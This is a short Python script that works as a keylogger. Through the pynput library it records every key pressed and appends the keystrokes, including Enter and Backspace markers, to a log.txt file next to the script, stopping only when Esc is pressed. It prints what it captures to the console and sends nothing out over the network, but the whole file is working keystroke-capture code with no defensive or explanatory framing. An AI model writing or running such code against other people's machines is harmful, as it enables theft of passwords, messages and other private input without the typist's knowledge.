import os
from pynput.keyboard import Listener, Key

# Get current script directory
base_dir = os.path.dirname(os.path.abspath(__file__))
file_path = os.path.join(base_dir, "log.txt")

print("File will be saved at:", file_path)

def writetofile(key):
    try:
        print("Key pressed:", key)

        try:
            letter = key.char
        except AttributeError:
            letter = str(key)

        if key == Key.space:
            letter = " "
        elif key == Key.enter:
            letter = "\n"
        elif key == Key.backspace:
            letter = "[BACKSPACE]"
        elif key in [Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_r]:
            return
        elif key == Key.esc:
            print("Exiting...")
            return False

        with open(file_path, "a") as f:
            f.write(letter)

    except Exception as e:
        print("Error:", e)

with Listener(on_press=writetofile) as listener:
    listener.join()